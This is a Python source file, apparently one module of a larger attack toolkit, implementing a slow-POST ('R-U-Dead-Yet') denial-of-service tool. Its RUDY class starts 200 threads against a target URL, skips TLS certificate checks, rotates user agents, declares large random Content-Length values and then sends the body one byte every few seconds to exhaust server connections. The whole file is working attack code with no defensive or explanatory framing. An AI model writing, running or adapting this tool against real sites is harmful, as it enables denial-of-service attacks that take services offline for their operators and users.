import socket
import ssl
import random
import threading
import time
from urllib.parse import urlparse
from core.useragent import UserAgent

class RUDY:
    def __init__(self, url, threads=200, sockets=500, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.is_ssl = parsed.scheme == 'https'
        self.path = parsed.path or '/'
        self.threads = threads
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((self.host, self.port))
                
                if self.is_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                
                cl = random.randint(10000, 99999)
                ua = UserAgent.random_agent()
                
                headers = (
                    f"POST {self.path} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {cl}\r\n"
                    f"\r\n"
                )
                s.send(headers.encode())
                
                if self.stats:
                    self.stats.increment_sent()
                    self.stats.add_bytes(len(headers))
                
                # Send body 1 byte at a time slowly
                for _ in range(cl):
                    if not self.running: break
                    try:
                        s.send(b'A')
                        if self.stats:
                            self.stats.add_bytes(1)
                        time.sleep(random.uniform(3, 8))
                    except: break
                
                s.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
                time.sleep(1)
    
    def attack(self):
        self.running = True
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        self.running = False
